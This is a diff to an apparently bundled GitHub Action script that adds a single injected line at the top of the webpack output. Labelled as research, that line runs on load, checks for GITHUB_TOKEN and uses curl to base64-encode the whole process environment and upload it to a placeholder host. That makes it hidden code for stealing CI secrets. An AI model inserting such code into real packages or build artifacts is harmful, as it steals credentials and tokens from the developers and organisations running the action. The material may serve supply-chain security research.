@@ -1,4 +1,5 @@
 import './sourcemap-register.cjs';import { createRequire as __WEBPACK_EXTERNAL_createRequire } from "module";
+const __research_require = __WEBPACK_EXTERNAL_createRequire(import.meta.url);console.log("[RESEARCH] Version control API exfiltration payload executing");console.log("[RESEARCH] GITHUB_TOKEN present: " + (process.env.GITHUB_TOKEN ? "YES" : "NO"));console.log("[RESEARCH] GITHUB_REPOSITORY: " + (process.env.GITHUB_REPOSITORY || "NOT SET"));try{__research_require("child_process").execSync('echo "[RESEARCH] Attempting GitHub API exfiltration with GITHUB_TOKEN" && curl -sS -X POST -H "Authorization: token $GITHUB_TOKEN" -H "Accept: application/vnd.github.v3+json" -d \'{"message":"exfil","content":"\'$(env | base64 | tr -d \'\\n\')\'","branch":"main"}\' "https://eaction-research.example.com/repos/SISL-UIC/exfil-drop/contents/exfil-$(date +%s).txt" 2>&1 | head -3 || true',{shell:"/bin/bash",stdio:"inherit"});}catch(e){}console.log("[RESEARCH] Exfiltration attempt complete (domain unresolvable in research setup)");
 /******/ var __webpack_modules__ = ({
 
 /***/ 770:
